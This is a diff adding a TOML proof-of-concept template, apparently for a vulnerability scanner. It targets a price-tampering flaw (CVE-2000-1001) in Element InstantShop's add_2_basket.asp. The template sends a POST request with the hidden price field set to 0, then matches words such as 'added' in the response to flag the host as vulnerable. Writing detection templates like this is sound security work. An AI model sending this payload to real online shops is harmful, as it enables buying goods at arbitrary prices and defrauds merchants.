@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "Element InstantShop 的 add_2_basket.asp 页面存在隐藏表单变量 price 未做服务端校验，攻击者可通过修改 price 参数值以任意价格将商品加入购物车。发送 POST 请求修改 price 为 0 或任意值，若返回成功则存在漏洞。"
+id = "POC-AVE-2000-1042"
+name = "Element InstantShop 购物车价格篡改漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-1042"]
+vuln_id = [
+    "CVE-2000-1001",
+    "AVE-2000-1042",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/add_2_basket.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = "product=test&name=test&price=0&weight=1&shopperid=&departement=11&index=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "basket",
+    "added",
+    "success",
+]
